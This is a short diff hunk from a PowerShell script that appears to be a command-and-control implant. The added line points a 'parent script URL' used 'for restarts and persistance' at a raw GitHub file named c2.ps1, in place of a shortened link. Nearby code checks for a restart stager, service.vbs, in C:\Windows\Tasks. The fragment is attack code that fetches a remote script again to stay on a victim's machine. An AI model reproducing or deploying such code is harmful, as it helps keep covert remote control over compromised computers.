@@ -12,7 +12,7 @@ if ($auto -eq 'n'){
 	$defaultstart = 0 
 }
 
-$global:parent = "https://shorturl.at/UBq0e" # parent script URL (for restarts and persistance)
+$global:parent = "https://raw.githubusercontent.com/KeksCrash/flip-games/refs/heads/master/c2.ps1" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
